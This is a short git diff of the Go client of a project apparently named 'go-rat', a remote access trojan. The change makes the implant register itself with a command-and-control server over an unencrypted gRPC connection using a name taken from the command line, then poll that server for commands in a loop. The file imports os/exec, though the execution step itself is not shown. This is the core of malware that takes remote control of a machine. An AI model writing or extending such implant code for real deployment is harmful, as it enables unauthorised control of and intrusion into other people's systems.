@@ -6,6 +6,7 @@ import (
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
+	"os"
 	"os/exec"
 	"strings"
 )
@@ -27,10 +28,12 @@ func main() {
 
 	client = grpcapi.NewImplantClient(conn)
 	ctx := context.Background()
-	for {
-		var req = new(grpcapi.Empty)
+	identity := new(grpcapi.Identity)
 
-		cmd, err := client.FetchCommand(ctx, req)
+	identity.Name = os.Args[1]
+	identity, err = client.RegisterImplant(ctx, identity)
+	for {
+		cmd, err := client.FetchCommand(ctx, identity)
 		// log a eliminar
 		if err != nil {
 			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
